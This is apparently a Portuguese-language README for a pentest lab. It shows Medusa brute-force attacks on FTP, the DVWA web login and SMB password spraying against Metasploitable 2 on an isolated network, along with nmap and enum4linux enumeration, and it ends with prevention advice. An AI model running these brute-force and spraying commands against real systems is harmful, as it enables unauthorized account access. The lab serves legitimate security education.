## 🔐 Medusa Brute Force Lab: Auditoria de Segurança em Ambientes Vulneráveis
  **Nota:** Este projeto foi desenvolvido para fins educacionais e de pesquisa em segurança cibernética, visando o estudo de vulnerabilidades e medidas de prevenção.

## 📋 Sobre o Projeto
Este projeto documenta a implementação de um laboratório prático de Pentest focado em ataques de força bruta (Brute Force). Utilizando o Kali Linux e a ferramenta Medusa, foram simulados ataques contra serviços de rede (FTP, SMB) e formulários Web em ambientes controlados e intencionalmente vulneráveis (Metasploitable 2 e DVWA).

O objetivo principal é demonstrar como configurações inseguras e credenciais fracas podem comprometer sistemas, além de exercitar a análise de protocolos e enumeração de serviços.

## 🛠️ Ferramentas e Tecnologias
Sistema Operacional Atacante: Kali Linux

**Alvo (Target):** Metasploitable 2 (Linux) & DVWA (Damn Vulnerable Web Application)

**Ferramenta de Ataque:** Medusa

**Reconhecimento & Enumeração:** NMAP, enum4linux

**Virtualização:** VirtualBox

## ⚙️ I. Configuração do Laboratório
Para garantir um ambiente seguro e isolado, a infraestrutura foi configurada da seguinte maneira:

Rede Host-only: Ambas as máquinas (Kali e Metasploitable) foram configuradas com adaptadores de rede "Host-only". Isso permite comunicação direta entre elas (simulando uma LAN), sem exposição à internet externa.

Snapshots: Criação de snapshots do Metasploitable 2 antes dos testes para restauração rápida em caso de corrupção do sistema.

### Verificação de Conectividade:

Descoberta do IP do alvo: 192.168.56.101

Teste de ping realizado com sucesso a partir do Kali Linux.

## 🚀 II. Ataque de Força Bruta em FTP
O foco inicial foi auditar um serviço FTP antigo.

1. Enumeração de Serviços
Utilizando o NMAP para identificar portas abertas e versões de serviços:

  nmap -sV -p 21,22,80,445,139 192.168.56.101
  
Resultado: Porta 21 (FTP) confirmada como aberta e acessível.

2. Preparação das Wordlists
Criação de listas de dicionário simples para o teste:

    echo -e "user\nmsfadmin\nadmin\nroot" > users.txt

    echo -e "password\n123456\nqwerty\nmsfadmin" > pass.txt
   
4. Execução com Medusa
O comando abaixo automatizou as tentativas de login no serviço FTP:

    medusa -h 192.168.56.101 -U users.txt -P pass.txt -M ftp -T 6
   
### ✅ Sucesso: Credenciais encontradas: USER: msfadmin / PASS: msfadmin.

## 🌐 III. Ataque a Formulário Web (DVWA)
Simulação de ataque contra um painel de login web utilizando o módulo HTTP do Medusa.

1. Análise da Requisição
Através das ferramentas de desenvolvedor do navegador, foram identificados os parâmetros do método POST e a string de falha:

Campos: username, password, Login

Indicador de Falha: "Login failed"

2. Execução do Ataque
Configuração do módulo HTTP para injetar as credenciais no formulário específico:

medusa -h 192.168.56.101 -U users.txt -P pass.txt -M http \
-m PAGE:'/dvwa/login.php' \
-m FORM:'username=^USER^&password=^PASS^&Login=Login' \
-m 'FAIL=Login failed' -t 6

### ✅ Sucesso: Credenciais encontradas: USER: admin / PASS: password.

## 📂 IV. Enumeração SMB e Password Spraying
Ataque em cadeia explorando o protocolo SMB para identificar usuários e testar senhas comuns.

1. Enumeração de Usuários
Utilização do enum4linux para extrair contas de usuário válidas do sistema alvo:

    enum4linux -a 192.168.56.101 | tee enum4_output.txt

2. Password Spraying
Ao invés de tentar muitas senhas para um usuário, tentamos poucas senhas para muitos usuários (Spray), evitando bloqueios de conta.

## Execução do Medusa com módulo SMBNT

    medusa -h 192.168.56.101 -U smb_users.txt -P senhas_spray.txt -M smbnt

### ✅ Sucesso: Acesso administrativo permitido com msfadmin / msfadmin. Validação: Acesso confirmado via ferramenta smbclient, listando os compartilhamentos de rede.

## 🧠 Conclusão e Aprendizados
Este laboratório evidenciou a criticidade de políticas de senhas fortes e a desativação de serviços desnecessários.

Vulnerabilidade: O uso de credenciais padrão (default) e protocolos sem criptografia ou proteção contra força bruta facilita o acesso não autorizado.

Prevenção: Implementação de autenticação multifator (MFA), uso de fail2ban para bloquear IPs após falhas sucessivas e monitoramento de logs.

**⚠️ Disclaimer**
Este repositório contém documentação de técnicas de segurança ofensiva para fins estritamente acadêmicos. O autor não se responsabiliza pelo uso indevido das informações aqui contidas.
